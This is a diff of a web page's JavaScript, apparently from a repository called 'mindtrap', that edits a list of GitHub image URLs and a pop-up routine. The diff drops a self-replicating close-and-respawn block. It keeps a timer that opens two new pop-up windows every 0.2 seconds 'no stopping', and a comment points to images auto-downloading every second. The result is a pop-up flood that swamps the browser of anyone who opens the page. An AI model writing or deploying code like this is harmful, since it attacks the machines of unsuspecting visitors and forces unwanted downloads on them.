@@ -61,25 +61,6 @@
             "https://raw.githubusercontent.com/velvettemptress/mindtrap/main/undefined_image%20%286%29.png",
             "https://raw.githubusercontent.com/velvettemptress/mindtrap/main/undefined_image%20%287%29.png",
             "https://raw.githubusercontent.com/velvettemptress/mindtrap/main/undefined_image%20%288%29.png",
-            "https://raw.githubusercontent.com/velvettemptress/mindtrap/main/undefined_image%20%2821%29.png",
-            "https://raw.githubusercontent.com/velvettemptress/mindtrap/main/undefined_image%20%2822%29.png",
-            "https://raw.githubusercontent.com/velvettemptress/mindtrap/main/undefined_image%20%2823%29.png",
-            "https://raw.githubusercontent.com/velvettemptress/mindtrap/main/undefined_image%20%2824%29.png",
-            "https://raw.githubusercontent.com/velvettemptress/mindtrap/main/undefined_image%20%286%29.png",
-            "https://raw.githubusercontent.com/velvettemptress/mindtrap/main/undefined_image%20%287%29.png",
-            "https://raw.githubusercontent.com/velvettemptress/mindtrap/main/undefined_image%20%288%29.png",
-            "https://raw.githubusercontent.com/velvettemptress/mindtrap/main/undefined_image%20%289%29.png",
-            "https://raw.githubusercontent.com/velvettemptress/mindtrap/main/undefined_image%20%2810%29.png",
-            "https://raw.githubusercontent.com/velvettemptress/mindtrap/main/undefined_image%20%2811%29.png",
-            "https://raw.githubusercontent.com/velvettemptress/mindtrap/main/undefined_image%20%2812%29.png",
-            "https://raw.githubusercontent.com/velvettemptress/mindtrap/main/undefined_image%20%2813%29.png",
-            "https://raw.githubusercontent.com/velvettemptress/mindtrap/main/undefined_image%20%2814%29.png",
-            "https://raw.githubusercontent.com/velvettemptress/mindtrap/main/undefined_image%20%2815%29.png",
-            "https://raw.githubusercontent.com/velvettemptress/mindtrap/main/undefined_image%20%2816%29.png",
-            "https://raw.githubusercontent.com/velvettemptress/mindtrap/main/undefined_image%20%2817%29.png",
-            "https://raw.githubusercontent.com/velvettemptress/mindtrap/main/undefined_image%20%2818%29.png",
-            "https://raw.githubusercontent.com/velvettemptress/mindtrap/main/undefined_image%20%2819%29.png",
-            "https://raw.githubusercontent.com/velvettemptress/mindtrap/main/undefined_image%20%2820%29.png",
             "https://raw.githubusercontent.com/velvettemptress/mindtrap/main/undefined_image%20%289%29.png"
         ];
 
@@ -116,19 +97,13 @@
 
                 if (popUp) {
                     popUp.document.write(`<img src="${imgURL}" width="100%" height="100%">`);
-                    
-                    // Each pop-up **must** spawn another pop-up
-                    setTimeout(() => {
-                        popUp.close();
-                        openPopup();
-                        openPopup();  // **Doubles the chaos**
-                    }, 700); // Each pop-up stays for 0.7 seconds before new ones appear
                 }
             }
 
+            // Open new pop-ups continuously, no stopping
             setInterval(() => {
                 openPopup();
-                openPopup();  // **More pop-ups spawn together**
+                openPopup();  // More pop-ups spawn together
             }, 200); // Every 0.2 seconds new pop-ups spawn
 
             // Auto-download images every second
